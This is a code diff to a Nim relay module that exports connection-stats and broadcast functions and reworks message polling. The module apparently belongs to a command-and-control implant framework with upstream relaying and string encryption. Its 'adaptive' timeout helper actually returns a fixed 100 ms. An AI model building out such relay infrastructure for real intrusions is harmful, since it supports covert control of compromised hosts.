@@ -1,6 +1,11 @@
 import strutils, json, times
 import ../../core/relay/[relay_protocol, relay_comm, relay_config]
-import ../../util/[strenc, sysinfo]
+import ../../util/sysinfo
+
+# Local adaptive timeout calculation to avoid circular imports
+proc getLocalAdaptiveTimeout(): int =
+    # Start with reasonable defaults and adjust based on success/failure
+    result = 100  # 100ms base timeout
 
 # Global relay state using relay_comm.nim types - NO MORE DIRECT SOCKETS!
 var g_relayServer*: RelayServer
@@ -13,6 +18,17 @@ proc relayServerPort*(): int = g_relayServer.port
 proc getRelayConnections*(): int = 
     let stats = getConnectionStats(g_relayServer)
     return stats.connections
+
+# Export connection stats function for main.nim
+proc getConnectionStats*(server: RelayServer): tuple[connections: int, activeConnections: int] {.exportc.} =
+    let stats = relay_comm.getConnectionStats(server)
+    return (connections: stats.connections, activeConnections: stats.connections)
+
+# Export broadcast message function for main.nim  
+proc broadcastMessage*(server: RelayServer, message: RelayMessage): bool {.exportc.} =
+    var mutableServer = server  # Create mutable copy
+    let sent = relay_comm.broadcastMessage(mutableServer, message)
+    return sent > 0
 
 # Process relay commands - USING SAFE relay_comm.nim FUNCTIONS
 proc processRelayCommand*(cmd: string): string =
@@ -161,11 +177,31 @@ proc pollRelayServerMessages*(): seq[RelayMessage] =
         return @[]
     
     try:
-        # USE SAFE FUNCTION FROM relay_comm.nim - NO MORE BUFFER OVERFLOW!
-        return pollRelayServer(g_relayServer, 10)  # 10ms timeout for non-blocking
-    except:
+        # CRITICAL: Process ALL available messages to prevent backlog
+        var allMessages: seq[RelayMessage] = @[]
+        var continuePolling = true
+        var pollCount = 0
+        
+        while continuePolling and pollCount < 10:  # Max 10 polls to prevent infinite loop
+            pollCount += 1
+            let adaptiveTimeout = getLocalAdaptiveTimeout()
+            let messages = pollRelayServer(g_relayServer, adaptiveTimeout)
+            
+            if messages.len > 0:
+                allMessages.add(messages)
+                when defined debug:
+                    echo "[DEBUG] 🔄 Relay polling cycle " & $pollCount & ": got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
+            else:
+                continuePolling = false  # No more messages available
+        
         when defined debug:
-            echo "[DEBUG] Error polling relay server messages"
+            if allMessages.len > 0:
+                echo "[DEBUG] 📥 Total messages processed: " & $allMessages.len & " (in " & $pollCount & " cycles)"
+        
+        return allMessages
+    except Exception as e:
+        when defined debug:
+            echo "[DEBUG] Error polling relay server messages: " & e.msg
         return @[]
 
 # Poll upstream relay for messages - USING SAFE FUNCTIONS
@@ -180,13 +216,14 @@ proc pollUpstreamRelayMessages*(): seq[RelayMessage] =
     
     try:
         when defined debug:
-            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Calling pollMessages with 10ms timeout"
+            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Calling pollMessages with adaptive timeout"
         
-        # USE SAFE FUNCTION FROM relay_comm.nim
-        let messages = pollMessages(upstreamRelay, 10)  # 10ms timeout for non-blocking
+        # USE SAFE FUNCTION FROM relay_comm.nim - ADAPTIVE TIMEOUT to adjust to network conditions
+        let adaptiveTimeout = getLocalAdaptiveTimeout()
+        let messages = pollMessages(upstreamRelay, adaptiveTimeout)
         
         when defined debug:
-            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Got " & $messages.len & " messages"
+            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
         
         return messages
     except Exception as e:
